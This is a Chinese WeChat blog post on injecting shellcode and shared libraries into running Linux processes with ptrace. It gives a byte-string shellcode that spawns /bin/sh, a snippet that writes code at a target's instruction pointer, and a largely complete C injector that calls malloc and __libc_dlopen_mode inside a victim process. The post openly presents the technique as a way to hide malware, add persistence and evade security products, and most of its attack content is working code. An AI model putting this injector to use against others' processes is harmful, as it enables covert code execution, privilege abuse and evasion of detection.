#  将shllcode注入Linux中正在运行的进程（C/C++代码实现）

原创 程序猿编码 [ 程序猿编码 ](javascript:void\(0\);)

**程序猿编码** ![]()

微信号 cjm20200105

功能介绍 嘿！编译过了吗

____

___发表于_

收录于合集

#linux 57 个

#代码 31 个

#c/c++ 65 个

#shellcode 1 个

#进程注入 1 个

我们知道shllcode与shell脚本无关，那么为什么要用这个名字呢？“shllcode”一词在历史上用于描述目标程序因漏洞攻击而执行的代码，并用于打开远程shell（即命令行解释器的实例），以便攻击者可以使用该shell与受害者的系统进行进一步交互。生成一个新的shell进程通常只需要几行代码，因此弹出shell是一种非常轻量级、高效的攻击手段，只要我们能够为目标程序提供正确的输入。

 **理解shellcode**

    
    
     unsigned char* shellcode = "\x48\x31\xc0\x48\x89\xc2\x48\x89"  
                               "\xc6\x48\x8d\x3d\x04\x00\x00\x00"  
                               "\x04\x3b\x0f\x05\x2f\x62\x69\x6e"  
                               "\x2f\x73\x68\x00\xcc\x90\x90\x90";  
    

shell代码是一种机器代码，在执行时会生成一个shell。并非所有的“Shellcode”都会生成壳Shellcode是以如下方式开发的机器代码指令的列表允许在运行时将其注入易受攻击的应用程序中。

在应用程序是通过利用应用程序中的各种安全漏洞来完成的，比如缓冲区溢出，它们是最受欢迎的。不能通过静态地址访问任何值因为这些地址在执行Shellcode的程序中不会是静态的。但是这不适用于环境变量。在创建shell代码时，始终使用寄存器的最小部分，以避免空字符串。

Shellcode不能包含null字符串，因为null字符串是一个分隔符。空字符串之后的任何内容在执行过程中都将被忽略。

 **Linux中的进程调试**

从技术上讲，访问另一个进程并对其进行修改的方法是通过操作系统提供的调试接口。Linux上的调试系统调用名为ptrace。gdb、radare2、ddd、strace所有这些工具都使用ptrace来提供服务。

ptrace系统调用允许一个进程调试另一个进程。使用ptrace，我们将能够停止目标进程的执行，检查其寄存器和内存的值，并将它们更改为我们想要的任何值。

有两种方法可以开始调试进程。第一个也是更直接的一个，是让我们的调试器启动进程…fork和exec。当您将程序名称作为参数传递给gdb或strace时，就会发生这种情况。

 **在linux上进行进程注入**

当我们需要更深入地隐藏恶意软件时，或者当我们想为恶意软件添加额外的持久性时，进程注入可能会很有用，有几种方法可以在linux上进行进程注入。与Windows不同，Windows为此提供了许多官方API，在linux上，如果我们想将代码注入正在运行的进程，我们几乎总是需要ptrace

    
    
           #include <sys/ptrace.h>  
      
           long ptrace(enum __ptrace_request request, pid_t pid,  
                       void *addr, void *data);  
      
    

![]()

    
    
    target = atoi (argv[1]);  
    printf ("+ Tracing process %d\n", target);  
    if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0)  
    {  
         perror ("ptrace(ATTACH):");  
         exit (1);  
    }  
    printf ("+ Waiting for process...\n");  
    wait (NULL);  
    

通过收集当前正在运行的进程的PID来附加到该进程。“通过使用ptrace调用连接到另一个进程，工具可以广泛控制其目标的操作。这包括对其文件描述符、内存和寄存器的操作。

我们只需使用PTRACE_ATTACH作为第一个参数来调用ptrace，并使用我们想要连接到的进程的pid作为第二个参数。之后，我们必须调用wait来等待指示连接进程完成的SIGTRAP信号。

    
    
      printf ("+ Getting Registers\n");  
      if ((ptrace (PTRACE_GETREGS, target, NULL, &regs)) < 0)  
        {  
          perror ("ptrace(GETREGS):");  
          exit (1);  
        }  
      
      printf ("+ Injecting shell code at %p\n", (void*)regs.rip);  
      inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);  
      regs.rip += 2;    
    

我们在这段代码中发现的第一件事是使用参数PTRACE_GETREGS调用ptrace。这个调用允许我们的程序从受控制的进程中检索寄存器的值。我们使用一个函数将shellcode注入到目标进程中。请注意，我们取的是regs.rip的值，它实际上包含目标进程的当前指令指针寄存器值。

 **生成Shellcode的方法**

    
    
     1.直接用十六进制代码编写shellcode。  
      
    2.编写汇编指令，然后提取操作码以生成shellcode。  
      
    3.用C编写，提取汇编指令，然后提取操作码，最后生成shellcode。  
    

所需工具:

    
    
     gcc-它是一个C和C++编译器。  
      
     ld–这是一个用于链接的工具。  
      
     nasm-Netwide汇编程序是一个可移植的80x86汇编程序  
      
     objdump–它是一个显示对象文件信息的工具。  
      
     strace–追踪系统调用和信号的工具  
    
    
    
    objdump -d ./sample-target|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'  
    

![]()

x86英特尔寄存器集:

![]()

 **将shllcode注入Linux中正在运行的进程（C/C++代码实现）**

    
    
      
     EAX、EBX、ECX和EDX都是32位通用寄存器。  
      
    AH、BH、CH和DH访问通用寄存器的高16位。  
      
    AL、BL、CL和DL访问通用寄存器的低8位。  
      
    EAX、AX、AH和AL被称为“累加器”寄存器，可用于I/O端口  
    访问、算术、中断调用等。我们可以使用这些寄存器来实现系统电话。  
      
    EBX、BX、BH和BL是“基”寄存器，用作内存的基指针通道我们将使用这个寄存器来存储系统调用的参数的指针。这寄存器有时也用于存储中断的返回值。  
      
    ECX、CX、CH和CL也称为“计数器”寄存器。  
      
    EDX、DX、DH和DL被称为“数据”寄存器，可用于I/O端口访问，算术和一些中断调用。  
    

 **proc文件系统相关内容**

  * /proc/[pid]/exe

> 给定进程的名称，尝试通过/proc搜索来查找其PID并读取/proc/[pid]/exe，直到找到名称与给定进程。

  * /proc/pid/maps

>
> 搜索目标进程的/proc/pid/maps条目并查找可执行文件，我们可以用来运行代码的内存区域。通过读取/proc/pid/maps获取进程内libc.so的基地址。
> 给定进程ID和共享库的名称，检查进程已通过读取其/proc/[pid]/maps文件。

 **将shllcode注入Linux中正在运行的进程（C/C++代码实现）**

process_inject

    
    
    ...  
    pid_t findProcessByName(char* processName);  
    long freespaceaddr(pid_t pid);  
    long getlibcaddr(pid_t pid);  
    int checkloaded(pid_t pid, char* libname);  
    long getFunctionAddress(char* funcName);  
    unsigned char* findRet(void* endAddr);  
    ...  
      
    void ptrace_attach(pid_t target);  
    void ptrace_detach(pid_t target);  
    void ptrace_getregs(pid_t target, struct REG_TYPE* regs);  
    void ptrace_cont(pid_t target);  
    void ptrace_setregs(pid_t target, struct REG_TYPE* regs);  
    siginfo_t ptrace_getsiginfo(pid_t target);  
    void ptrace_read(int pid, unsigned long addr, void *vptr, int len);  
    void ptrace_write(int pid, unsigned long addr, void *vptr, int len);  
    void checktargetsig(int pid);  
    void restoreStateAndDetach(pid_t target, unsigned long addr, void* backup, int datasize, struct REG_TYPE oldregs);  
    ...  
    int main(int argc, char** argv)  
    {  
    ...  
      
     if(!libPath)  
     {  
      fprintf(stderr, "[FATAL] Can't find file \"%s\"\n", libname);  
      return 1;  
     }  
      
     if(!strcmp(command, "-n"))  
     {  
      processName = commandArg;  
      target = findProcessByName(processName);  
      if(target == -1)  
      {  
       fprintf(stderr, "[FATAL] Doesn't look like a process named \"%s\" is running right now\n", processName);  
       return 1;  
      }  
      
      printf("[***] Targeting process \"%s\" with pid %d\n", processName, target);  
     }  
     else if(!strcmp(command, "-p"))  
     {  
      target = atoi(commandArg);  
      printf("[***] Targeting process with pid %d\n", target);  
     }  
     else  
     {  
      usage(argv[0]);  
      return 1;  
     }  
      
     int libPathLength = strlen(libPath) + 1;  
      
     int mypid = getpid();  
     long mylibcaddr = getlibcaddr(mypid);  
      
     long mallocAddr = getFunctionAddress("malloc");  
     long freeAddr = getFunctionAddress("free");  
     long dlopenAddr = getFunctionAddress("__libc_dlopen_mode");  
      
     // 计算系统调用的偏移量  
     long mallocOffset = mallocAddr - mylibcaddr;  
     long freeOffset = freeAddr - mylibcaddr;  
     long dlopenOffset = dlopenAddr - mylibcaddr;  
      
      
     // 获取目标进程的libc地址，并使用它查找要在目标进程中使用的系统调用的地址  
     long targetLibcAddr = getlibcaddr(target);  
     long targetMallocAddr = targetLibcAddr + mallocOffset;  
     long targetFreeAddr = targetLibcAddr + freeOffset;  
     long targetDlopenAddr = targetLibcAddr + dlopenOffset;  
      
     struct user_regs_struct oldregs, regs;  
     memset(&oldregs, 0, sizeof(struct user_regs_struct));  
     memset(&regs, 0, sizeof(struct user_regs_struct));  
      
     ptrace_attach(target);  
      
     ptrace_getregs(target, &oldregs);  
     memcpy(&regs, &oldregs, sizeof(struct user_regs_struct));  
      
     // find a good address to copy code to  
     long addr = freespaceaddr(target) + sizeof(long);  
      
        //我们必须在这里前进2个字节，因为rip会递增通过当前指令的大小要注入的函数的开头总是2字节长。  
     regs.rip = addr + 2;  
      
        //在x64上，因为它依赖于x64调用约定，其中  
       //参数通过寄存器rdi、rsi、rdx、rcx、r8和r9传递。  
     regs.rdi = targetMallocAddr;  
     regs.rsi = targetFreeAddr;  
     regs.rdx = targetDlopenAddr;  
     regs.rcx = libPathLength;  
     ptrace_setregs(target, &regs);  
      
     // 计算injectSharedLibrary（）的大小，这样我们就知道要分配多大的缓冲区。  
     size_t injectSharedLibrary_size = (intptr_t)injectSharedLibrary_end - (intptr_t)injectSharedLibrary;  
      
    ...  
     intptr_t injectSharedLibrary_ret = (intptr_t)findRet(injectSharedLibrary_end) - (intptr_t)injectSharedLibrary;  
      
     // back up whatever data used to be at the address we want to modify.  
     char* backup = malloc(injectSharedLibrary_size * sizeof(char));  
     ptrace_read(target, addr, backup, injectSharedLibrary_size);  
      
     // 设置一个缓冲区来保存我们要注入的代码目标进程。  
     char* newcode = malloc(injectSharedLibrary_size * sizeof(char));  
     memset(newcode, 0, injectSharedLibrary_size * sizeof(char));  
      
     // 将injectSharedLibrary（）的代码复制到缓冲区中。  
     memcpy(newcode, injectSharedLibrary, injectSharedLibrary_size - 1);  
      
     newcode[injectSharedLibrary_ret] = INTEL_INT3_INSTRUCTION;  
      
     ptrace_write(target, addr, newcode, injectSharedLibrary_size);  
      
     ptrace_cont(target);  
      
      
     //此时，目标应该已经运行malloc（）。检查其返回  
     //值，看看它是否成功，如果没有成功，就释放。  
     struct user_regs_struct malloc_regs;  
     memset(&malloc_regs, 0, sizeof(struct user_regs_struct));  
     ptrace_getregs(target, &malloc_regs);  
     unsigned long long targetBuf = malloc_regs.rax;  
     if(targetBuf == 0)  
     {  
      fprintf(stderr, "[FATAL] malloc() failed to allocate memory\n");  
      restoreStateAndDetach(target, addr, backup, injectSharedLibrary_size, oldregs);  
      free(backup);  
      free(newcode);  
      return 1;  
     }  
      
     ptrace_write(target, targetBuf, libPath, libPathLength);  
      
     // 再次继续执行目标以便调用  
     // __libc_dlopen_mode.  
     ptrace_cont(target);  
      
     // 查看调用dlopen后寄存器的外观。  
     struct user_regs_struct dlopen_regs;  
     memset(&dlopen_regs, 0, sizeof(struct user_regs_struct));  
     ptrace_getregs(target, &dlopen_regs);  
     unsigned long long libAddr = dlopen_regs.rax;  
      
     // 如果rax在这里为0，那么__libc_dlopenmode失败，应该释放。  
     if(libAddr == 0)  
     {  
      fprintf(stderr, "[FATAL] __libc_dlopen_mode() failed to load %s\n", libname);  
      restoreStateAndDetach(target, addr, backup, injectSharedLibrary_size, oldregs);  
      free(backup);  
      free(newcode);  
      return 1;  
     }  
      
     // 现在检查/proc/pid/maps以查看注入是否成功。  
     if(checkloaded(target, libname))  
     {  
      printf("[OK] \"%s\" successfully injected\n", libname);  
     }  
     else  
     {  
      fprintf(stderr, "[FATAL] Could not inject \"%s\"\n", libname);  
     }  
      
     ptrace_cont(target);  
      
     //在这一点上，如果一切按计划进行，已经加载  
     //目标进程中的共享库，所以完成了恢复  
     //旧状态并与目标分离。  
     restoreStateAndDetach(target, addr, backup, injectSharedLibrary_size, oldregs);  
    ...  
    }  
      
    

sample-target，测试程序：

    
    
    ...  
    void sleepfunc()  
    {  
     struct timespec* sleeptime = malloc(sizeof(struct timespec));  
      
     sleeptime->tv_sec = 1;  
     sleeptime->tv_nsec = 0;  
      
     while(1)  
     {  
      printf("sleeping...\n");  
      nanosleep(sleeptime, NULL);  
     }  
      
     free(sleeptime);  
    }  
      
    int main(int argc, char *argv[])  
    {  
     sleepfunc();  
     return 0;  
    }  
    

If you need the complete source code, please add the WeChat number (
**c17865354792** )

运行结果：![]()

在一个终端中，启动示例目标应用程序，该应用程序只需每秒输出“sleeping...”：![]()![]()

在另一个终端中，将sample-library.so注入目标应用程序：

![]()

输出应该如下所示：

![]()如果注入失败，请确保您的机器配置为允许进程ptrace（）其他未创建的进程。请参阅上面的“关于ptrace（）的注意事项”部分。

可以通过检查/proc/[pid]/maps来验证注入是否成功：

![]()使用gdb查看共享库信息![]()

 **总结**

进程注入是一种在单独的活动进程的地址空间中执行任意代码的方法。在另一个进程的上下文中运行代码可以允许访问该进程的内存、系统/网络资源，以及可能提升的权限。通过进程注入执行也可能逃避安全产品的检测，因为在合法进程下执行是被掩盖的。

有许多不同的方法可以将代码注入进程，其中许多方法滥用合法功能。这些实现适用于每个主要的操作系统，但通常是特定于平台的。

更复杂的样本可以利用命名管道或其他进程间通信（IPC）机制作为通信信道来执行对分段模块的多个进程注入，并进一步逃避检测。

Welcome to follow WeChat official account【 **程序猿编码** 】

参考：https://en.wikipedia.org/wiki/Signal_(IPC)
https://en.wikipedia.org/wiki/Ptrace http://man7.org/linux/man-
pages/man2/ptrace.2.html

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

